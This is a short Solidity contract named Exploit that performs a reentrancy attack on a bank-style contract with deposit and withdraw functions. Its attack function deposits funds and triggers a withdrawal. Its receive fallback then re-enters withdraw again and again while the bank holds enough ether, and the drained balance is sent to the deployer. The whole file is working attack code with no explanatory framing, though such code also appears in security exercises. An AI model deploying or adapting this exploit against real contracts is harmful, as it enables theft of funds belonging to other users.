// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Exploit {
    IBank public bank;
    address public owner;
    uint256 public amt;

    constructor(address target) payable {
        bank = IBank(target);
        owner = msg.sender;
    }

    function attack() external {
        amt = address(this).balance;
        bank.deposit{value: amt}();
        bank.withdraw();
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "send failed");
    }

    receive() external payable {
        if (amt > 0 && address(bank).balance >= amt) {
            bank.withdraw();
        }
    }
}